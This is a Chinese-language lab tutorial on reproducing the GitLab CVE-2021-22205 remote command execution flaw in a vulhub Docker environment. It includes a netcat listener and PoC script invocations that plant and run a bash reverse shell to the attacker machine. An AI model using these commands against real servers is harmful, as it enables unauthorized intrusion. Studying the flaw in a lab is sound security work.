# 【CVE-2021-22205】漏洞复现步骤详解

**前置知识：**

git ：是一种版本控制系统，是一个命令，是一种工具，类似于SVN

gitlib ：是用于实现git功能的开发库

github ：是一个基于git实现的在线代码仓库，包含一个网站界面，向互联网开放

gitlab ：是一个基于git实现的在线代码仓库软件，你可以用gitlab自己搭建一个类似于github一样的系统，一般用于在企业、学校等内部网络搭建git私服，可以看作是一个简单的github

漏洞编号：cve-2021-22205

漏洞类型：远程命令执行

漏洞威胁等级：高

漏洞影响版本：gitlab version < 13.10.3 

11.9 <= Gitlab   CE/EE < 13.8.8

13.9 <= Gitlab   CE/EE < 13.9.6

13.10 <= Gitlab  CE/EE < 13.10.3

漏洞环境和poc获取：

在linux下运行：

git clone https://github.com/vulhub/vulhub.git

cd vulhub/gitlab/CVE-2021-22205/

docker-compose up -d

docker ps -a

访问靶机ip+端口号

漏洞原理：

2021年4⽉15⽇，GitLab官方发布安全补丁更新修复了GitLab命令执行漏洞（CVE-2021- 22205）。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令，且发现由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响，CVSS评分为9.9。

**开始复现：** 

实验环境：攻击机kali  ,靶机docker下拉容器

访问靶机界面：192.168.210.42:8080

 

![](../Images/70e83909672b49c59bf0b00baf9f1d4a.png) 

查看命令：python3 CVE-2021-22205.py -h

 

验证poc：

Kali启命令行输入：python3 CVE-2021-22205.py -v true -t http://192.168.210.42:8080/  

 

实施攻击:

Kali 开nc监听：nc -l -p 8080

另起命令行输入

python3 CVE-2021-22205.py -a true -t http://192.168.210.42:8080 -c "echo 'bash -i >& /dev/tcp/192.168.210.167/8080 0>&1' > /tmp/1.sh"

python3 CVE-2021-22205.py -a true -t http://192.168.210.42:8080 -c "chmod +x /tmp/1.sh"

python3 CVE-2021-22205.py -a true -t http://192.168.210.42:8080 -c "/bin/bash /tmp/1.sh"

监听端反弹shell成功即可。
